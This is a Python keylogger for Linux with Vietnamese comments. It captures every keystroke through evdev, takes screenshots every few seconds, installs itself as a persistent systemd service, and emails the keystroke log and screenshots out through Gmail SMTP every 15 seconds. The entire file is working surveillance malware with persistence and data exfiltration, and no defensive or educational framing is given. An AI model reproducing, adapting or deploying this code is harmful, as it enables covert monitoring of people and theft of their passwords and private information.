# sudo rm /etc/systemd/system/keylogger.service
# sudo systemctl daemon-reload
# sudo systemctl reset-failed
import evdev
import os
import time
import threading
import smtplib
import glob

from email.message import EmailMessage

# --- Cấu hình Email ---
SMTP_SERVER = "smtp.gmail.com"  # SMTP Server của Gmail
SMTP_PORT = 587
EMAIL_SENDER = "myemail@gmail.com"  # Thay bằng email gửi
EMAIL_PASSWORD = "mypassword"  # Thay bằng mật khẩu ứng dụng (không dùng mật khẩu chính)
EMAIL_RECEIVER = "myemail@gmail.com"  # Thay bằng email nhận

# --- Bản đồ ánh xạ phím ---
key_map = {
    "KEY_A": ("a", "A"), "KEY_B": ("b", "B"), "KEY_C": ("c", "C"), "KEY_D": ("d", "D"),
    "KEY_E": ("e", "E"), "KEY_F": ("f", "F"), "KEY_G": ("g", "G"), "KEY_H": ("h", "H"),
    "KEY_I": ("i", "I"), "KEY_J": ("j", "J"), "KEY_K": ("k", "K"), "KEY_L": ("l", "L"),
    "KEY_M": ("m", "M"), "KEY_N": ("n", "N"), "KEY_O": ("o", "O"), "KEY_P": ("p", "P"),
    "KEY_Q": ("q", "Q"), "KEY_R": ("r", "R"), "KEY_S": ("s", "S"), "KEY_T": ("t", "T"),
    "KEY_U": ("u", "U"), "KEY_V": ("v", "V"), "KEY_W": ("w", "W"), "KEY_X": ("x", "X"),
    "KEY_Y": ("y", "Y"), "KEY_Z": ("z", "Z"),

    "KEY_1": ("1", "!"), "KEY_2": ("2", "@"), "KEY_3": ("3", "#"), "KEY_4": ("4", "$"),
    "KEY_5": ("5", "%"), "KEY_6": ("6", "^"), "KEY_7": ("7", "&"), "KEY_8": ("8", "*"),
    "KEY_9": ("9", "("), "KEY_0": ("0", ")"),

    "KEY_KP0": ("0", "0"), "KEY_KP1": ("1", "1"), "KEY_KP2": ("2", "2"), "KEY_KP3": ("3", "3"),
    "KEY_KP4": ("4", "4"), "KEY_KP5": ("5", "5"), "KEY_KP6": ("6", "6"), "KEY_KP7": ("7", "7"),
    "KEY_KP8": ("8", "8"), "KEY_KP9": ("9", "9"),

    "KEY_MINUS": ("-", "_"), "KEY_EQUAL": ("=", "+"), "KEY_LEFTBRACE": ("[", "{"),
    "KEY_RIGHTBRACE": ("]", "}"), "KEY_SEMICOLON": (";", ":"), "KEY_APOSTROPHE": ("'", '"'),
    "KEY_GRAVE": ("`", "~"), "KEY_BACKSLASH": ("\\", "|"), "KEY_COMMA": (",", "<"),
    "KEY_DOT": (".", ">"), "KEY_SLASH": ("/", "?"),

    "KEY_ENTER": ("\n", "\n"), "KEY_SPACE": (" ", " "), "KEY_BACKSPACE": ("[BACKSPACE]", "[BACKSPACE]"),
    "KEY_TAB": ("\t", "\t"), "KEY_ESC": ("[ESC]", "[ESC]"), "KEY_CAPSLOCK": ("[CAPSLOCK]", "[CAPSLOCK]"),

    "KEY_LEFTSHIFT": "[SHIFT]", "KEY_RIGHTSHIFT": "[SHIFT]",
    "KEY_LEFTCTRL": "[CTRL]", "KEY_RIGHTCTRL": "[CTRL]",
    "KEY_LEFTALT": "[ALT]", "KEY_RIGHTALT": "[ALT]"
}
def create_systemd_service():
    service_name = "keylogger.service"
    service_path = f"/etc/systemd/system/{service_name}"
    script_path = os.path.abspath(__file__)
    
    service_content = f"""[Unit]
Description=My Python Script
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
    
    # Ghi file service
    with open(service_name, "w") as f:
        f.write(service_content)
    
    # Copy vào thư mục systemd
    os.system(f"sudo mv {service_name} {service_path}")
    os.system("sudo systemctl daemon-reload")
    os.system(f"sudo systemctl enable {service_name}")
    os.system(f"sudo systemctl start {service_name}")
    
    print(f"Đã tạo systemd service tại {service_path} và kích hoạt nó.")
    
def find_keyboard():
    """Tự động tìm bàn phím"""
    for path in evdev.list_devices():
        device = evdev.InputDevice(path)
        if "keyboard" in device.name.lower() or "AT Translated Set 2 keyboard" in device.name:
            return path
    return None

def log_key(key):
    """Ghi phím vào file log"""
    with open("logkey.txt", "a") as f:
        f.write(key)

def take_screenshot():
    """Chụp ảnh màn hình mỗi 15 phút và lưu vào thư mục 'images'"""
    images_dir = "images"
    if not os.path.exists(images_dir):
        os.makedirs(images_dir)

    while True:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = os.path.join(images_dir, f"screenshot_{timestamp}.png")
        os.system("gnome-screenshot -f {filename}")
        #time.sleep(900)  # 15 phút
        time.sleep(14)  # 15s

def send_email():
    """Gửi email mỗi 30 phút với file log và ảnh chụp"""
    while True:
        #time.sleep(1800)  # Gửi mail mỗi 30 phút
        time.sleep(15)  # Gửi mail mỗi 15s
	
        msg = EmailMessage()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = "Keylog & Screenshots Report"

        msg.set_content("Đây là file log và ảnh chụp màn hình gần nhất.")

        # Đính kèm file log
        if os.path.exists("logkey.txt"):
            with open("logkey.txt", "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="logkey.txt")

        # Đính kèm ảnh chụp màn hình gần nhất
        images_dir = "images"
        latest_screenshot = max(glob.glob(f"{images_dir}/*.png"), key=os.path.getctime, default=None)

        if latest_screenshot:
            with open(latest_screenshot, "rb") as img:
                msg.add_attachment(img.read(), maintype="image", subtype="png", filename=os.path.basename(latest_screenshot))

        # Gửi mail
        try:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.send_message(msg)
            print("Email đã được gửi thành công!")
        except Exception as e:
            print(f"Lỗi gửi email: {e}")

def keylogger():
    keyboard_path = find_keyboard()
    
    if keyboard_path is None:
        print("Không tìm thấy bàn phím!")
        return

    print(f"Sử dụng bàn phím: {keyboard_path}")
    device = evdev.InputDevice(keyboard_path)

    shift_pressed = False  # Trạng thái Shift

    print(f"Listening on {keyboard_path}... Press Ctrl+C to stop.")
    
    for event in device.read_loop():
        if event.type == evdev.ecodes.EV_KEY:
            key_event = evdev.categorize(event)

            if key_event.keystate == evdev.KeyEvent.key_down:
                key_name = key_event.keycode

                # Kiểm tra nếu Shift đang được nhấn
                if key_name in ["KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"]:
                    shift_pressed = True
                    continue
                
                mapped_key = key_map.get(key_name, (key_name, key_name))  # Nếu có trong key_map thì dùng
                log_key(mapped_key[1] if shift_pressed else mapped_key[0])  # Ghi chữ hoa nếu Shift

            elif key_event.keystate == evdev.KeyEvent.key_up:
                # Khi Shift được nhả ra
                if key_event.keycode in ["KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"]:
                    shift_pressed = False

if __name__ == "__main__":
    create_systemd_service()
    # Chạy chụp ảnh màn hình song song với keylogger
    screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
    screenshot_thread.start()

    # Chạy gửi email song song
    email_thread = threading.Thread(target=send_email, daemon=True)
    email_thread.start()

    keylogger()

